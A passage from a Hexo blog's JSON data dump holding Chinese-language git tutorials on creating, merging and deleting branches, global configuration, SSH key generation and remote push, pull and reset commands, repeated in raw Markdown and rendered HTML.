</span><br><span class=\"line\">git commit -m &quot;***&quot;</span><br><span class=\"line\">git push origin issues1234</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<ul>\n<li>注意：将本地分支branch1推到远端的branch2操作步骤：<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git push origin branch1:branch2</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<ol>\n<li><p>删除分支</p>\n<p>git branch -D issues1234 // 本地强制删除分支 issues1234    </p>\n<p>git push origin  :issues1234  //推到远程</p>\n</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"一、-创建与合并分支\"><a href=\"#一、-创建与合并分支\" class=\"headerlink\" title=\"一、 创建与合并分支\"></a>一、 创建与合并分支</h2><ol>\n<li>从master分支创建dev分支并切换到dev分支<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git checkout master    </span><br><span class=\"line\">git checkout -b dev</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<ul>\n<li><p><code>git checkout -b dev</code> 等价于：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git branch dev    </span><br><span class=\"line\">git checkout dev</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>查看<code>本地当前分支</code>，分支前面带<code>&quot;*&quot;</code>表示当前分支，剩下的分支表示本地有的分支：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git branch</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>查看<code>远程全部分支</code>，白色的表示本地有的，红色的表示本地没有，仅在远程存在：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git branch -a</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<ol>\n<li><p>修改代码、提交代码(当前的操作是在dev分支上进行)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git add a.html</span><br><span class=\"line\">git commit -m &quot;提交文件a.html&quot;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>分支合并(将dev合并到master)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git checkout master     </span><br><span class=\"line\">git merge dev</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>合并完成后，删除dev分支.(删除dev分支时，注意我们当前所在的分支不能是dev分支)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git branch -d dev</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>删除后，查看分支(此时看不到dev分支了)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git branch</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>总结 ：工作中经常从<code>master</code>创建新分支，具体操作如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git checkout master   </span><br><span class=\"line\">git checkout -b  issues1234   </span><br><span class=\"line\">git push origin issues1234   </span><br><span class=\"line\">git add ..  </span><br><span class=\"line\">git commit -m &quot;***&quot;</span><br><span class=\"line\">git push origin issues1234</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<ul>\n<li>注意：将本地分支branch1推到远端的branch2操作步骤：<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git push origin branch1:branch2</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<ol>\n<li><p>删除分支</p>\n<p>git branch -D issues1234 // 本地强制删除分支 issues1234    </p>\n<p>git push origin  :issues1234  //推到远程</p>\n</li>\n</ol>\n"},{"title":"git使用指南","date":"2018-04-28T02:18:52.000Z","archives":"版本控制","_content":"# git使用\n\n## 第一步(安装/全局配置)\n**安装**\n+ 百度 git 然后下载安装\n\n**配置**\n    \n一次性配置,设置`username`和`email`，因为github每次`commit`都会记录他们\n\n+ $ git config --global user.name \"自定义名字\" (注册时填写的名字)\n+ $ git config --global user.email \"email@地址.com\"(注册的地址)\n\n**检验配置是否成功**\n+ 使用 `git config -l` 查看里面的 `user.name` 和 `email` 的值\n\n**查看git版本**\n+ git --version\n\n**创建公钥**\n  + 第一步 : 创建 `ssh-keygen -t rsa -C '[email地址]'`\n  + 第二步 : 查看公钥 根据git命令行提示走 然后 打开路径下的`id_rsa.pub`\n    - 进入c盘的`C:\\Users\\标准用户\\.ssh`（一般都是在这个文加下）生成了两个文件，用记事本打开`id_rsa.pub`，全选然后复制。\n  + 第三步 : 登录 github 设置公钥\n    - 进入github官网，选择`setting` -> `ssh and GPG keys` -> `new ssh key` 然后title随便写一个，在下面面的内容处粘贴刚复制的内容。\n  + 选择则保存，然后进入git客户端输入：`ssh -T git@github.com`\n  + 如果`ssh key`配置成功的话，会看到以下效果\n    - $ ssh -T git@github.com\n    - Hi SunOfHomeBoy! You've successfully authenticated, but GitHub does not provide shell access.\n    - 您已经成功地进行了身份验证，但是GitHub不提供shell访问。\n\n## 第二步(初始化项目/本地配置)\n**git初始化**\n  + 在项目目录下 输入 \"git init\"\n\n**git简单命令**\n  + \"ls -a\" 查看项目目录\n\n  + \"git status\" 查看git状态 // 重要\n\n  + \"git add <文件名>\" 向git仓库提交一个文件 // 重要\n  \n  + \"$ git add .\" #把前目录下的所有文件全部添加到暂存区\n  \n  + \"git rm --cached <文件名>\" 从git中移除文件\n  \n  + \"git log\" 查看日志\n\n## 第三步(开始建立远程仓库连接)\n+ `git remote add origin git@github.com:yourName/yourRepo.git`\n\n  `yourName`和`yourRepo`表示你在`github的用户名`和`新建仓库`，加完之后进入.git\n\n  git remote add origin git@github.com:SunOfHomeBoy/SunOfHomeBoy.github.io.git\n\n  $ git push\n  fatal: The current branch dev has no upstream branch.\n  To push the current branch and set the remote as upstream, use\n\n    `git push --set-upstream origin dev`\n\n## 第四步(工作区与暂存区[版本库])\n+ 在git add 提交文件后 使用 \"git commit -m '一句话描述'\" 命令\n\n+ \"git push origin master\" 推送到远程服务器\n\n+ \"git pull origin master\" 从远程服务器拉取到本地\n\n+ \"git checkout -- <文件名>\"  放弃更改\n\n+ \"git reset ‘git log 打印出来的 commit 后面的字符串’ --hard\"  //回退到某个版本\n\n## 第五步(版本库管理)\n**git 删除本地分支**\n+ git branch -D br\n\n**git 删除远程分支**\n+ git push origin :br  (origin 后面有空格)\n+ git push origin 【空格】【冒号】【你的分支名字】\n+ git push 【你的远程仓库在本地的别名】【空格】【冒号】【你的分支名字】\n\n**git代码库回滚** (指将代码库某分支退回到以前的某个\"commit id\")\n本地代码库回滚\n+ git reset --hard commit-id :回滚到commit-id，将commit-id之后提交的commit都去除\n+ git reset --hard HEAD~3：将最近3次的提交回滚\n\n## 附：\n**Git 常用命令大全**\n(http://blog.csdn.net/dengsilinming/article/details/8000622)\n\n**如何使用git上传代码到github**\n(https://jingyan.baidu.com/article/e5c39bf5c8c4d039d76033b2.html)\n\n常用命令,仅供参考。\n\n## 单位，win10电脑\n  2017年12月29日 09:15:05\n  Ubuntu SSH:\n\n  $ ssh-keygen -t rsa -C '903317164@qq.com'\n\nGenerating public/private rsa key pair.\n\nEnter file in which to save the key (/home/LiSC/.ssh/id_rsa):\nCreated directory '/home/LiSC/.ssh'.\nEnter passphrase (empty for no passphrase):\nEnter same passphrase again:\nYour identification has been saved in /home/LiSC/.ssh/id_rsa.\nYour public key has been saved in /home/LiSC/.ssh/id_rsa.pub.\n\nThe key fingerprint is:\n\nSHA256:SIyNEhF5sQX8YgjxEFjPBQnCFexfrL9fYLPX+L05QO0 903317164@qq.com\n\nThe key's randomart image is:\n\n+---[RSA 2048]----+\n|B+OO==o          |\n|o=.=+O           |\n| .+o*.=       .  |\n|  .oo..+     . . |\n|   ...+ S+  . .  |\n|     o  . + o. E |\n|      .  . + ..  |\n|       .  o . ...|\n|       .o.   . +o|\n+----[SHA256]-----+\n-----------------------------------------------\n~$ ssh-keygen -t rsa - c '903317164@qq.com\n生成公共/私有的rsa密钥对。\n输入保存密钥的文件(/ home/LiSC/.ssh/id_rsa):\n创建目录/ home / LiSC / . ssh。\n输入passphrase(没有密码):\n再次输入相同的密码:\n您的身份已经保存在/ home/ lisc/. ssh/id_rsa。\n\n您的公钥已保存在/ home/ lisc/.ssh/id_rsa.pub中。\n\n指纹的关键是:\nSHA256:SIyNEhF5sQX8YgjxEFjPBQnCFexfrL9fYLPX + L05QO0 903317164 @qq.com\n\n关键的随机图像是:\n+ - - - - - -[RSA 2048]- - - - - +\n| | B + OO = = o\n| o =。= + O |\n| + o *。=。|\n|。","source":"_posts/GIT/git使用指南.md","raw":"---\ntitle: git使用指南\ndate: 2018-04-28 10:18:52\ntags: git\narchives: 版本控制\ncategories: git\n---\n# git使用\n\n## 第一步(安装/全局配置)\n**安装**\n+ 百度 git 然后下载安装\n\n**配置**\n    \n一次性配置,设置`username`和`email`，因为github每次`commit`都会记录他们\n\n+ $ git config --global user.name \"自定义名字\" (注册时填写的名字)\n+ $ git config --global user.email \"email@地址.com\"(注册的地址)\n\n**检验配置是否成功**\n+ 使用 `git config -l` 查看里面的 `user.name` 和 `email` 的值\n\n**查看git版本**\n+ git --version\n\n**创建公钥**\n  + 第一步 : 创建 `ssh-keygen -t rsa -C '[email地址]'`\n  + 第二步 : 查看公钥 根据git命令行提示走 然后 打开路径下的`id_rsa.pub`\n    - 进入c盘的`C:\\Users\\标准用户\\.ssh`（一般都是在这个文加下）生成了两个文件，用记事本打开`id_rsa.pub`，全选然后复制。\n  + 第三步 : 登录 github 设置公钥\n    - 进入github官网，选择`setting` -> `ssh and GPG keys` -> `new ssh key` 然后title随便写一个，在下面面的内容处粘贴刚复制的内容。\n  + 选择则保存，然后进入git客户端输入：`ssh -T git@github.com`\n  + 如果`ssh key`配置成功的话，会看到以下效果\n    - $ ssh -T git@github.com\n    - Hi SunOfHomeBoy! You've successfully authenticated, but GitHub does not provide shell access.\n    - 您已经成功地进行了身份验证，但是GitHub不提供shell访问。\n\n## 第二步(初始化项目/本地配置)\n**git初始化**\n  + 在项目目录下 输入 \"git init\"\n\n**git简单命令**\n  + \"ls -a\" 查看项目目录\n\n  + \"git status\" 查看git状态 // 重要\n\n  + \"git add <文件名>\" 向git仓库提交一个文件 // 重要\n  \n  + \"$ git add .\" #把前目录下的所有文件全部添加到暂存区\n  \n  + \"git rm --cached <文件名>\" 从git中移除文件\n  \n  + \"git log\" 查看日志\n\n## 第三步(开始建立远程仓库连接)\n+ `git remote add origin git@github.com:yourName/yourRepo.git`\n\n  `yourName`和`yourRepo`表示你在`github的用户名`和`新建仓库`，加完之后进入.git\n\n  git remote add origin git@github.com:SunOfHomeBoy/SunOfHomeBoy.github.io.git\n\n  $ git push\n  fatal: The current branch dev has no upstream branch.\n  To push the current branch and set the remote as upstream, use\n\n    `git push --set-upstream origin dev`\n\n## 第四步(工作区与暂存区[版本库])\n+ 在git add 提交文件后 使用 \"git commit -m '一句话描述'\" 命令\n\n+ \"git push origin master\" 推送到远程服务器\n\n+ \"git pull origin master\" 从远程服务器拉取到本地\n\n+ \"git checkout -- <文件名>\"  放弃更改\n\n+ \"git reset ‘git log 打印出来的 commit 后面的字符串’ --hard\"  //回退到某个版本\n\n## 第五步(版本库管理)\n**git 删除本地分支**\n+ git branch -D br\n\n**git 删除远程分支**\n+ git push origin :br  (origin 后面有空格)\n+ git push origin 【空格】【冒号】【你的分支名字】\n+ git push 【你的远程仓库在本地的别名】【空格】【冒号】【你的分支名字】\n\n**git代码库回滚** (指将代码库某分支退回到以前的某个\"commit id\")\n本地代码库回滚\n+ git reset --hard commit-id :回滚到commit-id，将commit-id之后提交的commit都去除\n+ git reset --hard HEAD~3：将最近3次的提交回滚\n\n## 附：\n**Git 常用命令大全**\n(http://blog.csdn.net/dengsilinming/article/details/8000622)\n\n**如何使用git上传代码到github**\n(https://jingyan.baidu.com/article/e5c39bf5c8c4d039d76033b2.html)\n\n常用命令,仅供参考。\n\n## 单位，win10电脑\n  2017年12月29日 09:15:05\n  Ubuntu SSH:\n\n  $ ssh-keygen -t rsa -C '903317164@qq.com'\n\nGenerating public/private rsa key pair.\n\nEnter file in which to save the key (/home/LiSC/.ssh/id_rsa):\nCreated directory '/home/LiSC/.ssh'.\nEnter passphrase (empty for no passphrase):\nEnter same passphrase again:\nYour identification has been saved in /home/LiSC/.ssh/id_rsa.\nYour public key has been saved in /home/LiSC/.ssh/id_rsa.pub.\n\nThe key fingerprint is:\n\nSHA256:SIyNEhF5sQX8YgjxEFjPBQnCFexfrL9fYLPX+L05QO0 903317164@qq.com\n\nThe key's randomart image is:\n\n+---[RSA 2048]----+\n|B+OO==o          |\n|o=.=+O           |\n| .+o*.=       .  |\n|  .oo..+     . . |\n|   ...+ S+  . .  |\n|     o  . + o. E |\n|      .  . + ..  |\n|       .  o . ...|\n|       .o.   . +o|\n+----[SHA256]-----+\n-----------------------------------------------\n~$ ssh-keygen -t rsa - c '903317164@qq.com\n生成公共/私有的rsa密钥对。\n输入保存密钥的文件(/ home/LiSC/.ssh/id_rsa):\n创建目录/ home / LiSC / . ssh。\n输入passphrase(没有密码):\n再次输入相同的密码:\n您的身份已经保存在/ home/ lisc/. ssh/id_rsa。\n\n您的公钥已保存在/ home/ lisc/.ssh/id_rsa.pub中。\n\n指纹的关键是:\nSHA256:SIyNEhF5sQX8YgjxEFjPBQnCFexfrL9fYLPX + L05QO0 903317164 @qq.com\n\n关键的随机图像是:\n+ - - - - - -[RSA 2048]- - - - - +\n| | B + OO = = o\n| o =。= + O |\n| + o *。=。|\n|。","slug":"GIT/git使用指南","published":1,"updated":"2018-09-05T06:33:18.491Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxvt003yzodvkgywsi78","content":"<h1 id=\"git使用\"><a href=\"#git使用\" class=\"headerlink\" title=\"git使用\"></a>git使用</h1><h2 id=\"第一步-安装-全局配置\"><a href=\"#第一步-安装-全局配置\" class=\"headerlink\" title=\"第一步(安装/全局配置)\"></a>第一步(安装/全局配置)</h2><p><strong>安装</strong></p>\n<ul>\n<li>百度 git 然后下载安装</li>\n</ul>\n<p><strong>配置</strong></p>\n<p>一次性配置,设置<code>username</code>和<code>email</code>，因为github每次<code>commit</code>都会记录他们</p>\n<ul>\n<li>$ git config –global user.name “自定义名字” (注册时填写的名字)</li>\n<li>$ git config –global user.email “email@地址.com”(注册的地址)</li>\n</ul>\n<p><strong>检验配置是否成功</strong></p>\n<ul>\n<li>使用 <code>git config -l</code> 查看里面的 <code>user.name</code> 和 <code>email</code> 的值</li>\n</ul>\n<p><strong>查看git版本</strong></p>\n<ul>\n<li>git –version</li>\n</ul>\n<p><strong>创建公钥</strong></p>\n<ul>\n<li>第一步 : 创建 <code>ssh-keygen -t rsa -C &#39;[email地址]&#39;</code></li>\n<li>第二步 : 查看公钥 根据git命令行提示走 然后 打开路径下的<code>id_rsa.pub</code><ul>\n<li>进入c盘的<code>C:\\Users\\标准用户\\.ssh</code>（一般都是在这个文加下）生成了两个文件，用记事本打开<code>id_rsa.pub</code>，全选然后复制。</li>\n</ul>\n</li>\n<li>第三步 : 登录 github 设置公钥<ul>\n<li>进入github官网，选择<code>setting</code> -&gt; <code>ssh and GPG keys</code> -&gt; <code>new ssh key</code> 然后title随便写一个，在下面面的内容处粘贴刚复制的内容。</li>\n</ul>\n</li>\n<li>选择则保存，然后进入git客户端输入：<code>ssh -T git@github.com</code></li>\n<li>如果<code>ssh key</code>配置成功的话，会看到以下效果<ul>\n<li>$ ssh -T git@github.com</li>\n<li>Hi SunOfHomeBoy! You’ve successfully authenticated, but GitHub does not provide shell access.</li>\n<li>您已经成功地进行了身份验证，但是GitHub不提供shell访问。</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"第二步-初始化项目-本地配置\"><a href=\"#第二步-初始化项目-本地配置\" class=\"headerlink\" title=\"第二步(初始化项目/本地配置)\"></a>第二步(初始化项目/本地配置)</h2><p><strong>git初始化</strong></p>\n<ul>\n<li>在项目目录下 输入 “git init”</li>\n</ul>\n<p><strong>git简单命令</strong></p>\n<ul>\n<li><p>“ls -a” 查看项目目录</p>\n</li>\n<li><p>“git status” 查看git状态 // 重要</p>\n</li>\n<li><p>“git add &lt;文件名&gt;” 向git仓库提交一个文件 // 重要</p>\n</li>\n<li><p>“$ git add .” #把前目录下的所有文件全部添加到暂存区</p>\n</li>\n<li><p>“git rm –cached &lt;文件名&gt;” 从git中移除文件</p>\n</li>\n<li><p>“git log” 查看日志</p>\n</li>\n</ul>\n<h2 id=\"第三步-开始建立远程仓库连接\"><a href=\"#第三步-开始建立远程仓库连接\" class=\"headerlink\" title=\"第三步(开始建立远程仓库连接)\"></a>第三步(开始建立远程仓库连接)</h2><ul>\n<li><p><code>git remote add origin git@github.com:yourName/yourRepo.git</code></p>\n<p><code>yourName</code>和<code>yourRepo</code>表示你在<code>github的用户名</code>和<code>新建仓库</code>，加完之后进入.git</p>\n<p>git remote add origin git@github.com:SunOfHomeBoy/SunOfHomeBoy.github.io.git</p>\n<p>$ git push<br>fatal: The current branch dev has no upstream branch.<br>To push the current branch and set the remote as upstream, use</p>\n<p>  <code>git push --set-upstream origin dev</code></p>\n</li>\n</ul>\n<h2 id=\"第四步-工作区与暂存区-版本库\"><a href=\"#第四步-工作区与暂存区-版本库\" class=\"headerlink\" title=\"第四步(工作区与暂存区[版本库])\"></a>第四步(工作区与暂存区[版本库])</h2><ul>\n<li><p>在git add 提交文件后 使用 “git commit -m ‘一句话描述’” 命令</p>\n</li>\n<li><p>“git push origin master” 推送到远程服务器</p>\n</li>\n<li><p>“git pull origin master” 从远程服务器拉取到本地</p>\n</li>\n<li><p>“git checkout – &lt;文件名&gt;”  放弃更改</p>\n</li>\n<li><p>“git reset ‘git log 打印出来的 commit 后面的字符串’ –hard”  //回退到某个版本</p>\n</li>\n</ul>\n<h2 id=\"第五步-版本库管理\"><a href=\"#第五步-版本库管理\" class=\"headerlink\" title=\"第五步(版本库管理)\"></a>第五步(版本库管理)</h2><p><strong>git 删除本地分支</strong></p>\n<ul>\n<li>git branch -D br</li>\n</ul>\n<p><strong>git 删除远程分支</strong></p>\n<ul>\n<li>git push origin :br  (origin 后面有空格)</li>\n<li>git push origin 【空格】【冒号】【你的分支名字】</li>\n<li>git push 【你的远程仓库在本地的别名】【空格】【冒号】【你的分支名字】</li>\n</ul>\n<p><strong>git代码库回滚</strong> (指将代码库某分支退回到以前的某个”commit id”)<br>本地代码库回滚</p>\n<ul>\n<li>git reset –hard commit-id :回滚到commit-id，将commit-id之后提交的commit都去除</li>\n<li>git reset –hard HEAD~3：将最近3次的提交回滚</li>\n</ul>\n<h2 id=\"附：\"><a href=\"#附：\" class=\"headerlink\" title=\"附：\"></a>附：</h2><p><strong>Git 常用命令大全</strong><br>(<a href=\"http://blog.csdn.net/dengsilinming/article/details/8000622\" target=\"_blank\" rel=\"noopener\">http://blog.csdn.net/dengsilinming/article/details/8000622</a>)</p>\n<p><strong>如何使用git上传代码到github</strong><br>(<a href=\"https://jingyan.baidu.com/article/e5c39bf5c8c4d039d76033b2.html\" target=\"_blank\" rel=\"noopener\">https://jingyan.baidu.com/article/e5c39bf5c8c4d039d76033b2.html</a>)</p>\n<p>常用命令,仅供参考。</p>\n<h2 id=\"单位，win10电脑\"><a href=\"#单位，win10电脑\" class=\"headerlink\" title=\"单位，win10电脑\"></a>单位，win10电脑</h2><p>  2017年12月29日 09:15:05<br>  Ubuntu SSH:</p>\n<p>  $ ssh-keygen -t rsa -C ‘903317164@qq.com’</p>\n<p>Generating public/private rsa key pair.</p>\n<p>Enter file in which to save the key (/home/LiSC/.ssh/id_rsa):<br>Created directory ‘/home/LiSC/.ssh’.<br>Enter passphrase (empty for no passphrase):<br>Enter same passphrase again:<br>Your identification has been saved in /home/LiSC/.ssh/id_rsa.<br>Your public key has been saved in /home/LiSC/.ssh/id_rsa.pub.</p>\n<p>The key fingerprint is:</p>\n<p>SHA256:SIyNEhF5sQX8YgjxEFjPBQnCFexfrL9fYLPX+L05QO0 903317164@qq.com</p>\n<p>The key’s randomart image is:</p>\n<p>+—[RSA 2048]—-+<br>|B+OO==o          |<br>|o=.=+O           |<br>| .+o*.=       .  |<br>|  .oo..+     . . |<br>|   …+ S+  . .  |<br>|     o  . + o. E |<br>|      .  . + ..  |<br>|       .  o . …|<br>|       .o.   . +o|</p>\n<h2 id=\"—-SHA256-—–\"><a href=\"#—-SHA256-—–\" class=\"headerlink\" title=\"+—-[SHA256]—–+\"></a>+—-[SHA256]—–+</h2><p>~$ ssh-keygen -t rsa - c ‘903317164@qq.com<br>生成公共/私有的rsa密钥对。<br>输入保存密钥的文件(/ home/LiSC/.ssh/id_rsa):<br>创建目录/ home / LiSC / . ssh。<br>输入passphrase(没有密码):<br>再次输入相同的密码:<br>您的身份已经保存在/ home/ lisc/. ssh/id_rsa。</p>\n<p>您的公钥已保存在/ home/ lisc/.ssh/id_rsa.pub中。</p>\n<p>指纹的关键是:<br>SHA256:SIyNEhF5sQX8YgjxEFjPBQnCFexfrL9fYLPX + L05QO0 903317164 @qq.com</p>\n<p>关键的随机图像是:</p>\n<ul>\n<li><ul>\n<li><ul>\n<li><ul>\n<li><ul>\n<li><ul>\n<li>-[RSA 2048]- - - - - +<br>| | B + OO = = o<br>| o =。= + O |<br>| + o *。=。|<br>|。</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"git使用\"><a href=\"#git使用\" class=\"headerlink\" title=\"git使用\"></a>git使用</h1><h2 id=\"第一步-安装-全局配置\"><a href=\"#第一步-安装-全局配置\" class=\"headerlink\" title=\"第一步(安装/全局配置)\"></a>第一步(安装/全局配置)</h2><p><strong>安装</strong></p>\n<ul>\n<li>百度 git 然后下载安装</li>\n</ul>\n<p><strong>配置</strong></p>\n<p>一次性配置,设置<code>username</code>和<code>email</code>，因为github每次<code>commit</code>都会记录他们</p>\n<ul>\n<li>$ git config –global user.name “自定义名字” (注册时填写的名字)</li>\n<li>$ git config –global user.email “email@地址.com”(注册的地址)</li>\n</ul>\n<p><strong>检验配置是否成功</strong></p>\n<ul>\n<li>使用 <code>git config -l</code> 查看里面的 <code>user.name</code> 和 <code>email</code> 的值</li>\n</ul>\n<p><strong>查看git版本</strong></p>\n<ul>\n<li>git –version</li>\n</ul>\n<p><strong>创建公钥</strong></p>\n<ul>\n<li>第一步 : 创建 <code>ssh-keygen -t rsa -C &#39;[email地址]&#39;</code></li>\n<li>第二步 : 查看公钥 根据git命令行提示走 然后 打开路径下的<code>id_rsa.pub</code><ul>\n<li>进入c盘的<code>C:\\Users\\标准用户\\.ssh</code>（一般都是在这个文加下）生成了两个文件，用记事本打开<code>id_rsa.pub</code>，全选然后复制。</li>\n</ul>\n</li>\n<li>第三步 : 登录 github 设置公钥<ul>\n<li>进入github官网，选择<code>setting</code> -&gt; <code>ssh and GPG keys</code> -&gt; <code>new ssh key</code> 然后title随便写一个，在下面面的内容处粘贴刚复制的内容。</li>\n</ul>\n</li>\n<li>选择则保存，然后进入git客户端输入：<code>ssh -T git@github.com</code></li>\n<li>如果<code>ssh key</code>配置成功的话，会看到以下效果<ul>\n<li>$ ssh -T git@github.com</li>\n<li>Hi SunOfHomeBoy! You’ve successfully authenticated, but GitHub does not provide shell access.</li>\n<li>您已经成功地进行了身份验证，但是GitHub不提供shell访问。</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"第二步-初始化项目-本地配置\"><a href=\"#第二步-初始化项目-本地配置\" class=\"headerlink\" title=\"第二步(初始化项目/本地配置)\"></a>第二步(初始化项目/本地配置)</h2><p><strong>git初始化</strong></p>\n<ul>\n<li>在项目目录下 输入 “git init”</li>\n</ul>\n<p><strong>git简单命令</strong></p>\n<ul>\n<li><p>“ls -a” 查看项目目录</p>\n</li>\n<li><p>“git status” 查看git状态 // 重要</p>\n</li>\n<li><p>“git add &lt;文件名&gt;” 向git仓库提交一个文件 // 重要</p>\n</li>\n<li><p>“$ git add .” #把前目录下的所有文件全部添加到暂存区</p>\n</li>\n<li><p>“git rm –cached &lt;文件名&gt;” 从git中移除文件</p>\n</li>\n<li><p>“git log” 查看日志</p>\n</li>\n</ul>\n<h2 id=\"第三步-开始建立远程仓库连接\"><a href=\"#第三步-开始建立远程仓库连接\" class=\"headerlink\" title=\"第三步(开始建立远程仓库连接)\"></a>第三步(开始建立远程仓库连接)</h2><ul>\n<li><p><code>git remote add origin git@github.com:yourName/yourRepo.git</code></p>\n<p><code>yourName</code>和<code>yourRepo</code>表示你在<code>github的用户名</code>和<code>新建仓库</code>，加完之后进入.git</p>\n<p>git remote add origin git@github.com:SunOfHomeBoy/SunOfHomeBoy.github.io.git</p>\n<p>$ git push<br>fatal: The current branch dev has no upstream branch.<br>To push the current branch and set the remote as upstream, use</p>\n<p>  <code>git push --set-upstream origin dev</code></p>\n</li>\n</ul>\n<h2 id=\"第四步-工作区与暂存区-版本库\"><a href=\"#第四步-工作区与暂存区-版本库\" class=\"headerlink\" title=\"第四步(工作区与暂存区[版本库])\"></a>第四步(工作区与暂存区[版本库])</h2><ul>\n<li><p>在git add 提交文件后 使用 “git commit -m ‘一句话描述’” 命令</p>\n</li>\n<li><p>“git push origin master” 推送到远程服务器</p>\n</li>\n<li><p>“git pull origin master” 从远程服务器拉取到本地</p>\n</li>\n<li><p>“git checkout – &lt;文件名&gt;”  放弃更改</p>\n</li>\n<li><p>“git reset ‘git log 打印出来的 commit 后面的字符串’ –hard”  //回退到某个版本</p>\n</li>\n</ul>\n<h2 id=\"第五步-版本库管理\"><a href=\"#第五步-版本库管理\" class=\"headerlink\" title=\"第五步(版本库管理)\"></a>第五步(版本库管理)</h2><p><strong>git 删除本地分支</strong></p>\n<ul>\n<li>git branch -D br</li>\n</ul>\n<p><strong>git 删除远程分支</strong></p>\n<ul>\n<li>git push origin :br  (origin 后面有空格)</li>\n<li>git push origin 【空格】【冒号】【你的分支名字】</li>\n<li>git push 【你的远程仓库在本地的别名】【空格】【冒号】【你的分支名字】</li>\n</ul>\n<p><strong>git代码库回滚</strong> (指将代码库某分支退回到以前的某个”commit id”)<br>本地代码库回滚</p>\n<ul>\n<li>git reset –hard commit-id :回滚到commit-id，将commit-id之后提交的commit都去除</li>\n<li>git reset –hard HEAD~3：将最近3次的提交回滚</li>\n</ul>\n<h2 id=\"附：\"><a href=\"#附：\" class=\"headerlink\" title=\"附：\"></a>附：</h2><p><strong>Git 常用命令大全</strong><br>(<a href=\"http://blog.csdn.net/dengsilinming/article/details/8000622\" target=\"_blank\" rel=\"noopener\">http://blog.csdn.net/dengsilinming/article/details/8000622</a>)</p>\n<p><strong>如何使用git上传代码到github</strong><br>(<a href=\"https://jingyan.baidu.com/article/e5c39bf5c8c4d039d76033b2.html\" target=\"_blank\" rel=\"noopener\">https://jingyan.baidu.com/article/e5c39bf5c8c4d039d76033b2.html</a>)</p>\n<p>常用命令,仅供参考。</p>\n<h2 id=\"单位，win10电脑\"><a href=\"#单位，win10电脑\" class=\"headerlink\" title=\"单位，win10电脑\"></a>单位，win10电脑</h2><p>  2017年12月29日 09:15:05<br>  Ubuntu SSH:</p>\n<p>  $ ssh-keygen -t rsa -C ‘903317164@qq.com’</p>\n<p>Generating public/private rsa key pair.</p>\n<p>Enter file in which to save the key (/home/LiSC/.ssh/id_rsa):<br>Created directory ‘/home/LiSC/.ssh’.<br>Enter passphrase (empty for no passphrase):<br>Enter same passphrase again:<br>Your identification has been saved in /home/LiSC/.ssh/id_rsa.<br>Your public key has been saved in /home/LiSC/.ssh/id_rsa.pub.</p>\n<p>The key fingerprint is:</p>\n<p>SHA256:SIyNEhF5sQX8YgjxEFjPBQnCFexfrL9fYLPX+L05QO0 903317164@qq.com</p>\n<p>The key’s randomart image is:</p>\n<p>+—[RSA 2048]—-+<br>|B+OO==o          |<br>|o=.=+O           |<br>| .+o*.=       .  |<br>|  .oo..+     . . |<br>|   …+ S+  . .  |<br>|     o  . + o. E |<br>|      .  . + ..  |<br>|       .  o . …|<br>|       .o.   . +o|</p>\n<h2 id=\"—-SHA256-—–\"><a href=\"#—-SHA256-—–\" class=\"headerlink\" title=\"+—-[SHA256]—–+\"></a>+—-[SHA256]—–+</h2><p>~$ ssh-keygen -t rsa - c ‘903317164@qq.com<br>生成公共/私有的rsa密钥对。<br>输入保存密钥的文件(/ home/LiSC/.ssh/id_rsa):<br>创建目录/ home / LiSC / . ssh。<br>输入passphrase(没有密码):<br>再次输入相同的密码:<br>您的身份已经保存在/ home/ lisc/. ssh/id_rsa。</p>\n<p>您的公钥已保存在/ home/ 